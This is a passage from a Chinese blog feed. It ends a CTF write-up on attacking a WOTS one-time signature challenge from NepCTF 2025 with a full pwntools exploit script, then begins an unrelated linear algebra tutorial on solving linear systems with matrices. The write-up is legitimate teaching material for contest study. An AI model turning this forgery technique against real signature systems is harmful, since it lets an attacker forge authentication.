function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先计算出对消息b&#x27;happy for NepCTF 2025&#x27;来说,它的step的状态</span></span><br><span class="line">msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_step</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3_n(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    step = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> // <span class="number">8</span>)]</span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:  <span class="comment"># 如果消息的哈希值对应索引符合hex_symbols中的某一个</span></span><br><span class="line">                <span class="built_in">sum</span>[i] += j  <span class="comment"># sum就会加上索引</span></span><br><span class="line">        step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">step_des = c_step(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(step_des)</span><br><span class="line">candidate = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = os.urandom(<span class="number">5</span>)</span><br><span class="line">        step = c_step(x)</span><br><span class="line">        <span class="keyword">if</span> step[i] &lt;= step_des[i]:</span><br><span class="line">            candidate.append(x.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(candidate)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">candate = [&#x27;e528ac746f&#x27;, &#x27;ad694be518&#x27;, &#x27;12e5f725da&#x27;, &#x27;f38b0675a8&#x27;, &#x27;d126dd5379&#x27;, &#x27;e1bcffc062&#x27;, &#x27;f54fb14599&#x27;, &#x27;9e4ce2c549&#x27;, &#x27;42bb777a69&#x27;, &#x27;37773f0771&#x27;, &#x27;605fc06b20&#x27;, &#x27;3dd0ba0a5b&#x27;, &#x27;f01e1de8f1&#x27;, &#x27;651d6251d5&#x27;, &#x27;07e90c3714&#x27;, &#x27;2e70224c66&#x27;, &#x27;cd73d66284&#x27;, &#x27;dd270bb39b&#x27;, &#x27;0afbbf91bb&#x27;, &#x27;21954ad626&#x27;, &#x27;53c6e4b606&#x27;, &#x27;cb6632070b&#x27;, &#x27;25e43397f6&#x27;, &#x27;d6f54113c6&#x27;, &#x27;0f1dbf213f&#x27;, &#x27;8a71fbbcef&#x27;, &#x27;1e484654d5&#x27;, &#x27;c0cce89280&#x27;, &#x27;720c8fde3a&#x27;, &#x27;b42e82218b&#x27;, &#x27;8fb6002d72&#x27;, &#x27;fa4804f1af&#x27;, &#x27;ff05854709&#x27;, &#x27;0e83a61727&#x27;, &#x27;d087fccce3&#x27;, &#x27;08958c158a&#x27;, &#x27;5bc77069ea&#x27;, &#x27;b1173ddd72&#x27;, &#x27;f0bf6f2b4f&#x27;, &#x27;b144583404&#x27;, &#x27;8ebc7c5eb8&#x27;, &#x27;dd82f6435d&#x27;, &#x27;903377a152&#x27;, &#x27;f31923e8d1&#x27;, &#x27;58ab6aac57&#x27;, &#x27;6bc744f37c&#x27;, &#x27;4ca8b192b1&#x27;, &#x27;9f22cebc5f&#x27;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>最后使用<code>candidate</code>中的消息泄露消息<code>b'happy for NepCTF 2025'</code>的<code>qq</code>数组的值，最后再使用选项<code>2</code>认证即可。最终exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    d = [i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    h = sm3.sm3_hash(d)  <span class="comment"># 应该是计算一个hash值</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits // <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先计算出对消息b&#x27;happy for NepCTF 2025&#x27;来说,它的step的状态</span></span><br><span class="line">msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_step</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3_n(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    step = [<span class="number">0</span>]*<span class="number">48</span></span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[<span class="number">8</span> * i: <span class="number">8</span> * i + <span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span> // <span class="number">8</span>)]</span><br><span class="line">    hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        step[i] = a[i]</span><br><span class="line">    <span class="built_in">sum</span> = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">            <span class="keyword">if</span> m[j - <span class="number">1</span>] == hex_symbols[i]:  <span class="comment"># 如果消息的哈希值对应索引符合hex_symbols中的某一个</span></span><br><span class="line">                <span class="built_in">sum</span>[i] += j  <span class="comment"># sum就会加上索引</span></span><br><span class="line">        step[i + <span class="number">32</span>] = <span class="built_in">sum</span>[i] % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line">step_des = c_step(<span class="string">b&#x27;happy for NepCTF 2025&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(step_des)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">candate = []</span></span><br><span class="line"><span class="string">for i in range(48):</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        x = os.urandom(5)</span></span><br><span class="line"><span class="string">        step = c_step(x)</span></span><br><span class="line"><span class="string">        if step[i] &lt;= step_des[i]:</span></span><br><span class="line"><span class="string">            candate.append(x.hex())</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">print(candate)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">candate = [<span class="string">&#x27;e528ac746f&#x27;</span>, <span class="string">&#x27;ad694be518&#x27;</span>, <span class="string">&#x27;12e5f725da&#x27;</span>, <span class="string">&#x27;f38b0675a8&#x27;</span>, <span class="string">&#x27;d126dd5379&#x27;</span>, <span class="string">&#x27;e1bcffc062&#x27;</span>, <span class="string">&#x27;f54fb14599&#x27;</span>, <span class="string">&#x27;9e4ce2c549&#x27;</span>, <span class="string">&#x27;42bb777a69&#x27;</span>, <span class="string">&#x27;37773f0771&#x27;</span>, <span class="string">&#x27;605fc06b20&#x27;</span>, <span class="string">&#x27;3dd0ba0a5b&#x27;</span>, <span class="string">&#x27;f01e1de8f1&#x27;</span>, <span class="string">&#x27;651d6251d5&#x27;</span>, <span class="string">&#x27;07e90c3714&#x27;</span>, <span class="string">&#x27;2e70224c66&#x27;</span>, <span class="string">&#x27;cd73d66284&#x27;</span>, <span class="string">&#x27;dd270bb39b&#x27;</span>, <span class="string">&#x27;0afbbf91bb&#x27;</span>, <span class="string">&#x27;21954ad626&#x27;</span>, <span class="string">&#x27;53c6e4b606&#x27;</span>, <span class="string">&#x27;cb6632070b&#x27;</span>, <span class="string">&#x27;25e43397f6&#x27;</span>, <span class="string">&#x27;d6f54113c6&#x27;</span>, <span class="string">&#x27;0f1dbf213f&#x27;</span>, <span class="string">&#x27;8a71fbbcef&#x27;</span>, <span class="string">&#x27;1e484654d5&#x27;</span>, <span class="string">&#x27;c0cce89280&#x27;</span>, <span class="string">&#x27;720c8fde3a&#x27;</span>, <span class="string">&#x27;b42e82218b&#x27;</span>, <span class="string">&#x27;8fb6002d72&#x27;</span>, <span class="string">&#x27;fa4804f1af&#x27;</span>, <span class="string">&#x27;ff05854709&#x27;</span>, <span class="string">&#x27;0e83a61727&#x27;</span>, <span class="string">&#x27;d087fccce3&#x27;</span>, <span class="string">&#x27;08958c158a&#x27;</span>, <span class="string">&#x27;5bc77069ea&#x27;</span>, <span class="string">&#x27;b1173ddd72&#x27;</span>, <span class="string">&#x27;f0bf6f2b4f&#x27;</span>, <span class="string">&#x27;b144583404&#x27;</span>, <span class="string">&#x27;8ebc7c5eb8&#x27;</span>, <span class="string">&#x27;dd82f6435d&#x27;</span>, <span class="string">&#x27;903377a152&#x27;</span>, <span class="string">&#x27;f31923e8d1&#x27;</span>, <span class="string">&#x27;58ab6aac57&#x27;</span>, <span class="string">&#x27;6bc744f37c&#x27;</span>, <span class="string">&#x27;4ca8b192b1&#x27;</span>, <span class="string">&#x27;9f22cebc5f&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#host = &quot;nepctf30-tjtu-vam0-ewpd-crfw4njdv208.nepctf.com&quot;</span></span><br><span class="line"><span class="comment">#port = &#x27;443&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(host, port, ssl=True, sni=host)</span></span><br><span class="line">p = process([<span class="string">&#x27;python3.10&#x27;</span>,<span class="string">&#x27;server.py&#x27;</span>])</span><br><span class="line">hash_list = []</span><br><span class="line">qq = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(candate)):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;msg&#x27;</span>,candate[i].encode())</span><br><span class="line">    <span class="built_in">hash</span> = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>).decode()[<span class="number">3</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">hash</span> = <span class="built_in">hash</span>.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    hash_ = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">hash</span>)):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">            hash_.append(<span class="built_in">hash</span>[j][<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hash_.append(<span class="built_in">hash</span>[j][<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line">    step = c_step(<span class="built_in">bytes</span>.fromhex(candate[i]))</span><br><span class="line">    t = step_des[i] - step[i]</span><br><span class="line">    <span class="comment">#print(hash_)</span></span><br><span class="line">    qq.append(SM3_n(<span class="built_in">bytes</span>.fromhex(hash_[i]),t))</span><br><span class="line">    <span class="comment">#print(qq)</span></span><br><span class="line"><span class="built_in">print</span>(qq)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me a qq:&#x27;</span>,<span class="built_in">str</span>(qq).encode())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/image-20250901225954934.png" alt="image-20250901225954934"></p>]]></content>
    
    
    <summary type="html">前言：newctf2025出现了这个签名，学习一下</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="数字签名" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-线性方程组</title>
    <link href="http://iyheart.github.io/2025/08/26/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/"/>
    <id>http://iyheart.github.io/2025/08/26/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</id>
    <published>2025-08-26T09:00:37.000Z</published>
    <updated>2025-08-26T07:44:05.477Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考教材：<code>邱维声—高等代数大学高等代数课程创新教材</code></p></li><li><p>参考视频：<a href="https://www.bilibili.com/video/BV1jR4y1M78W?vd_source=bbdaef564df94fc8991902ba22c6761b">北大丘维声教授清华高等代数课程1080P高清修复版(全151集)</a></p></li></ul><h1 id="前言">前言</h1><ul><li>在学习高等代数之前，先对高等代数有一定的了解。高等代数研究的核心其实是其实是<code>解方程</code>，解多元一次方程以及解一元多次方程，再拓展到n元n次方程。这就是高等代数主要研究的内容。</li><li>书中前言这张图片对高等代数的概括非常好，研究的方向就是这两大线<ul><li>研究解多元一次方程的问题引入了<code>矩阵</code>、<code>向量</code>、<code>线性空间</code>等线性代数相关的内容，在线性代数中最关键的其实是<code>线性空间</code>、<code>线性映射</code></li><li>研究解一元多次方程的问题引入了<code>群</code>、<code>环</code>、<code>域</code>，最终形成了<code>抽象代数</code>这一门学科，而抽象代数的核心定理其实是<code>伽罗瓦大定理</code></li></ul></li></ul><p><img src="/2025/08/26/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image-20250814172045086.png" alt="image-20250814172045086"></p><ul><li><code>邱维声</code>老先生的这本书的主线其实是：研究线性空间和多项式环的结构及其态射（线性映射，多项式环的通用性质），所以高等代数更多的是<strong>研究线性代数</strong>以及<strong>多项式环</strong>，而群和域这边是在抽象代数去研究。</li></ul><h1 id="线性方程组矩阵消元法">线性方程组矩阵消元法</h1><h2 id="线性方程组与矩阵">线性方程组与矩阵</h2><blockquote><p><strong>线性方程</strong>：</p><p>像$a_{1}x_1+a_2x_2+…+a_nx_n=b_1$这样，左端都是未知量$x_1,x_2,…,x_n$的一个齐次式，右端是常数被称为<strong>线性方程</strong>。</p><ul><li>系数：每个未知量前面的数称为<strong>系数</strong></li><li>常数项：右端的项被称为<strong>常数项</strong></li></ul><p><strong>线性方程组</strong>：</p><p>两个及以上的线性方程组合，就被称为<strong>线性方程组</strong>，含<code>n</code>个未知量的线性方程组被称为<code>n</code>元线性方程组，它的一般形式如下：</p><ul><li>$a_{11},a_{12},…,a_{sn}$是<strong>系数</strong></li><li>$b_1,b_2,…,b_n$是<strong>常数项</strong>，一般写在等号右边</li><li>方程个数为s与未知量个数n可以<code>相等</code>，也可以是<code>s&lt;n</code>或者<code>s&gt;n</code>的关系</li><li>将$x_1,x_2,…,x_n$代入$c_1,c_2,…,c_n$后，每个方程都变成恒等式，那么这n元有序数组$(c_1,c_2,…,c_n)$是线性方程组的<strong>一组解</strong>，方程组的所有解组成的几何称为这个方程组的解集。</li></ul><p>$$<br>\begin{cases}<br>a_{11}x_1+a_{12}x_2+…+a_{1n}x_n &amp;= b_1 \<br>a_{21}x_1+a_{22}x_2+…+a_{2n}x_n &amp;= b_2\</p><pre><code class="language-\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&amp;~~~~~~\vdots\">a_&#123;s1&#125;x_1+a_&#123;s2&#125;x_2+...+a_&#123;sn&#125;x_n&amp;=b_s\end&#123;cases&#125;$$</code></pre></blockquote><blockquote><p><strong>矩阵</strong>：由于解方程都是对系数和常数项操作并没有改变未知数，所以为了方便就引入了<strong>一个数表</strong>即<strong>矩阵</strong>，将方程组的未知数前面的系数和常数项提取出来。写成如下形式：<br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \dots &amp; a_{1n} &amp; b_{1} \<br>a_{21} &amp; a_{22} &amp; \dots &amp; a_{2n} &amp; b_{2} \<br>\vdots &amp; \vdots &amp; \ddots&amp; \vdots &amp; \vdots \<br>a_{s1} &amp; a_{s2} &amp; \dots &amp; a_{sn} &amp; b_{s}<br>\end{bmatrix}<br>$$<br><strong>系数矩阵</strong>：只提取方程组的系数做为一个矩阵，这样的矩阵叫做<strong>系数矩阵</strong><br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \dots &amp; a_{1n}  \<br>a_{21} &amp; a_{22} &amp; \dots &amp; a_{2n}  \<br>\vdots &amp; \vdots &amp; \ddots&amp; \vdots  \<br>a_{s1} &amp; a_{s2} &amp; \dots &amp; a_{sn}<br>\end{bmatrix}<br>$$<br><strong>增广矩阵</strong>：提取方程组的系数和常数项做为一个矩阵，这样的矩阵叫做<strong>增广矩阵</strong><br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \dots &amp; a_{1n} &amp; b_{1} \<br>a_{21} &amp; a_{22} &amp; \dots &amp; a_{2n} &amp; b_{2} \<br>\vdots &amp; \vdots &amp; \ddots&amp; \vdots &amp; \vdots \<br>a_{s1} &amp; a_{s2} &amp; \dots &amp; a_{sn} &amp; b_{s}<br>\end{bmatrix}<br>$$<br><strong>矩阵的定义</strong>：</p><p>由<code>s·m</code>个数排成<code>s</code>行、<code>m</code>列的一张表称为一个<code>s×m</code>矩阵，其中的每一个数称为这个矩阵的<strong>一个元素</strong>，第<code>i</code>行与第<code>j</code>列交叉位置的元素称为矩阵的<code>(s,j)</code>元。</p><p>注解1：矩阵通常用大写英文字母$\mathbf{A,B,C,…}$表示。一个<code>s×m</code>矩阵可以简单地记作$\mathbf{A}<em>{s×m}$，它的<code>(i,j)</code>元记作$\mathbf{A}(i;j)$，如果矩阵$\mathbf{A}$的<code>(i,j)</code>元是$a</em>{ij}$，那么可以记作$\mathbf{A}=(a_{ij})$</p><p>注解2：元素全为0的矩阵称为<strong>零矩阵</strong>，简记作$\mathbf{0}$。s行m列的零矩阵可以记成$\mathbf{0}_{s×m}$</p><p>注解3：如果一个矩阵$\mathbf{A}$的行数与列数相等，则称它为<strong>方阵</strong>。m行n列的方阵也称为<strong>m级矩阵</strong></p><p>注解4：对于两个矩阵$\mathbf{A,B}$，如果它们的行数相等，都等于<code>s</code>；列数相等，都等于<code>m</code>；并且$\mathbf{A}(i;j)=\mathbf{B}(i;j),i=1,2,…,s,~~~j=1,2,…,m$，那么称矩阵$\mathbf{A,B}$相等，记作$\mathbf{A=B}$</p></blockquote><blockquote><p>例题1：解方程组<br>$$<br>\begin{cases}<br>x_1+3x_2+x_3&amp;=2\<br>3x_1+4x_2+2x_3&amp;=9\<br>-x_1-5x_2+4x_4&amp;=10\<br>2x_1+7x_2+x_3&amp;=10<br>\end{cases}<br>$$</p></blockquote><ol><li><p>先使用<code>2式+1式·(-3)</code>、<code>3式+1式</code>、<code>4式+1式·(-2)</code>，消去<code>2、3、4式</code>的$x_1$，然后交换<code>2式和4式</code>的位置</p></li><li><p>再使用<code>3式+2式·2</code>、<code>4式+2式·5</code>，以及<code>4式+3式·2</code>得到了一个<strong>阶梯型方程组</strong></p></li></ol><p>$$<br>\begin{cases}<br>x_1+3x_2+x_3&amp;=2\</p><pre><code class="language-x_2-x_3&amp;=-3\">~~~~~~~~~~~~~~~~~~~~x_3&amp;=6\\~~~~~~~~~~~~~~~~~~~~~0&amp;=0\end&#123;cases&#125;$$3. 最后使用$3式·\frac&#123;1&#125;3&#123;&#125;$、`1式+3式·(-1)`、`2式+3式`、`1式+2式·(-3)`就可以得到**简化阶梯形方程组**，并且可以看出该方程组的解为$(3,-1,2)'$$$\begin&#123;cases&#125;x_1~~~~&amp;=3\\~~~~~~x_2&amp;=1\\~~~~~~~~~~~~~x_3&amp;=2\\~~~~~~~~~~~~~~0&amp;=0\end&#123;cases&#125;$$## 线性方程组求解与矩阵化简&gt;**线性方程组的初等变换**：&gt;&gt;1. 把一个方程的倍数加到另一个方程上&gt;2. 互换两个方程的位置&gt;3. 用一个非零数称某一个方程&gt;&gt;注解：通过线性方程组初等变换后的方程组的解与原方程组相同，所以使用有限次数的线性方程组的初等变换就可以求出n元线性方程组的解。&gt;**矩阵的初等行变换**：&gt;&gt;由于矩阵是线性方程组抽象出来的，所以线性方程组的初等变换运用到矩阵就是矩阵的初等行变换&gt;&gt;1. 把一行的倍数加到另一行上&gt;2. 互换两行的位置&gt;3. 用一个非零数乘某一行&gt;&gt;&gt;&gt;**矩阵的行阶梯**：&gt;&gt;阶梯型方程组转换成矩阵形式，就变成了**矩阵的行阶梯**，有以下几个特征：&gt;&gt;1. 元素全为`0`的行（称为**零行**）在下方(如果有零行)；&gt;2. 元素不全为`0`的行（称为**非零行**），从左边数起第一个不为0的元素称为**主元**，它们的列指标随着行指标的递增而**严格增大**。即行指标增大`1`，列指标也需要增大`1`而不是增大`2`&gt;&gt;$$&gt;\begin&#123;bmatrix&#125;&gt;1&amp;3&amp;1&amp;2\\&gt;0&amp;1&amp;-1&amp;-3\\&gt;0&amp;0&amp;3&amp;6\\&gt;0&amp;0&amp;0&amp;0&gt;\end&#123;bmatrix&#125;&gt;$$&gt;&gt;&gt;&gt;**简化行阶梯形矩阵**：&gt;&gt;简化阶梯形方程组抽象成矩阵形式就变成了简化行阶梯形矩阵，特点如下：&gt;&gt;1. 它阶梯形矩阵&gt;2. 每个非零行的主元都是1&gt;3. 每个主元所在的列的其余元素都是0&gt;&gt;$$&gt;\begin&#123;bmatrix&#125;&gt;1&amp;0&amp;0&amp;3\\&gt;0&amp;1&amp;0&amp;-1\\&gt;0&amp;0&amp;1&amp;2\\&gt;0&amp;0&amp;0&amp;0&gt;\end&#123;bmatrix&#125;&gt;$$&gt;&gt;**定理1**：&gt;&gt;任意一个矩阵都可以经过一系列初等行变换化成**阶梯型矩阵**&gt;&gt;&gt;&gt;**推理1**：&gt;&gt;任意一个矩阵都可以经过一系列初等行变换化成**简化行阶梯形矩阵**&gt;&gt;&gt;&gt;**矩阵解线性方程组**：&gt;&gt;将方程组转换为增广矩阵后，通过初等行变换化成**阶梯型矩阵**，再化成**简化行阶梯形矩阵**就是解线性方程组。&gt;例题2：使用矩阵解方程组&gt;$$&gt;\begin&#123;cases&#125;&gt;x_1+3x_2+x_3&amp;=2\\&gt;3x_1+4x_2+2x_3&amp;=9\\&gt;-x_1-5x_2+4x_4&amp;=10\\&gt;2x_1+7x_2+x_3&amp;=10&gt;\end&#123;cases&#125;&gt;$$![image-20250825144013357](高等代数-线性方程组/image-20250825144013357.png)# 线性方程组解的情况与判别&gt;**线性方程组解的情况**：&gt;&gt;系数和常数项为有理数（或实数，或复数）的n元线性方程组的解的情况有且只有三种可能：无解，有唯一解，有无穷多个解。&gt;&gt;注解：如果一个线性方程组有解，那么称它是**相容的**；否则，称它是**不相容的**&gt;&gt;&gt;&gt;**线性方程组解的判别**：&gt;&gt;把n元线性方程组的增广矩阵经过初等行变换化成阶梯形矩阵，如果相应的阶梯型方程组出现`0=d(其中d是非零数)`，这种方程，那么原方程无解；否则，有解。&gt;&gt;当有解的时候，如果阶梯形矩阵的非零行数目`r`等于未知量数目`n`，那么原方程组有唯一解，如果`r&lt;n`那么原方程有无穷多个解。&gt;&gt;注解：当原方程有无穷多个解的时候，简化的行阶梯形矩阵就会出现如下形式&gt;$$&gt;\begin&#123;bmatrix&#125;&gt;1&amp;-1&amp;0&amp;2\\&gt;0&amp;0&amp;1&amp;-1\\&gt;0&amp;0&amp;0&amp;0&gt;\end&#123;bmatrix&#125;&gt;$$&gt;转换成线性方程组后就如下：&gt;$$&gt;\begin&#123;cases&#125;&gt;x_1-x_2&amp;=2\\&gt;x_3&amp;=1\\&gt;0&amp;=0&gt;\end&#123;cases&#125;&gt;$$&gt;之后化简就如下,下面表达式其实就是原线性方程组的**一般解**，其中行阶梯矩阵对应的主元为系数的未知量$x_1,x_3$称为**主变量**，其余未知量$x_2$称为**自由未知量**：&gt;$$&gt;\begin&#123;cases&#125;&gt;x_1&amp;=x_2+2\\&gt;x_3&amp;=1\\&gt;0&amp;=0&gt;\end&#123;cases&#125;&gt;$$&gt;&gt;&gt;&gt;&gt;**齐次线性方程组**：&gt;&gt;常数项全为0的线性方程组称为**齐次线性方程组**。`(0,0,...,0)`是齐次线性方程组的一个解，称为**零解**。其余的解（如果有）称为**非零解**。该方程如下图所示，由于常数项全为`0`，所以在将其转换为矩阵的求解时，只需要使用**系数矩阵**即可：&gt;$$&gt;\begin&#123;cases&#125;&gt;a_&#123;11&#125;x_1+a_&#123;12&#125;x_2+...+a_&#123;1n&#125;x_n &amp;= 0 \\&gt;a_&#123;21&#125;x_1+a_&#123;22&#125;x_2+...+a_&#123;2n&#125;x_n &amp;= 